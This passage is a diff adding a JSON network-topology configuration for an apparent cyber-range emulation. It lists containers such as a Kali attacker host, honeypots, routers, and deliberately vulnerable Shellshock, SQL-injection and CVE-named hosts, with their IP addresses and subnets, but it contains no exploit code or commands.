@@ -1,0 +1,5596 @@
+{
+  "agent_ip_template": "<EXECUTION_ID>.9.1.191",
+  "containers": [
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_client_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.1.254",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.254",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_client_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_ftp_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.79",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.79",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_ftp_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_hacker_kali_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.1.191",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.191",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_hacker_kali_1",
+      "os": "kali",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.21",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.21",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_router_2_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.10",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.1.10",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.10",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_router_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_ssh_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.78",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.3.78",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_3",
+            "subnet_mask": "<EXECUTION_ID>.9.3.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.78",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_ssh_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_samba_2_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.3",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.4.3",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_4",
+            "subnet_mask": "<EXECUTION_ID>.9.4.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.3",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_samba_2",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_samba_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.6.7",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_6",
+            "subnet_mask": "<EXECUTION_ID>.9.6.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.7",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_samba_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.5.101",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_5",
+            "subnet_mask": "<EXECUTION_ID>.9.5.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.7.101",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.101",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_shellshock_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.3.54",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_3",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.9.54",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.54",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_shellshock_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_sql_injection_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.4.74",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_4",
+            "subnet_mask": "<EXECUTION_ID>.9.4.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.5.74",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_5",
+            "subnet_mask": "<EXECUTION_ID>.9.5.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.74",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_sql_injection_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_cve_2010_0426_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.4.61",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_4",
+            "subnet_mask": "<EXECUTION_ID>.9.4.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.8.61",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.61",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_cve_2010_0426_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_cve_2015_1427_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.5.62",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_5",
+            "subnet_mask": "<EXECUTION_ID>.9.5.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.6.62",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_6",
+            "subnet_mask": "<EXECUTION_ID>.9.6.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.7.62",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth3",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.62",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth4",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_cve_2015_1427_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_1_2-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.4",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.4",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_2",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_1_3-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.5",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.5",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_3",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_1_4-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.6",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.6",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_4",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_1_5-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.8",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.8",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_5",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_1_6-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.9",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.9",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_1",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_6",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_cve_2015_3306_1_1-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.2.178",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.178",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_cve_2015_3306_1",
+      "os": "debian",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_1",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_2-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.9.11",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.11",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_2",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_3-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.9.12",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.12",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_3",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_4-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.9.13",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.13",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_4",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_5-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.9.14",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.14",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_5",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_6-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.7.15",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.15",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_6",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_7-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.7.16",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.16",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_7",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_8-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.7.17",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.17",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_8",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_9-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.7.18",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.18",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_9",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_10-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.8.19",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.19",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ]
+      ],
+      "level": "9",
+      "name": "csle_honeypot_2",
+      "os": "ubuntu",
+      "physical_host_ip": "",
+      "restart_policy": "on-failure:3",
+      "suffix": "_10",
+      "version": "0.10.0"
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "execution_ip_first_octet": -1,
+      "full_name_str": "csle_honeypot_2_11-level9--1",
+      "ips_and_networks": [
+        [
+          "<EXECUTION_ID>.9.8.20",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        ],
+        [
+          "<EXECUTION_ID>.9.253.20",
+          {
+            "bitmask": "255.255.255.0",
+            "interface": "eth2",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
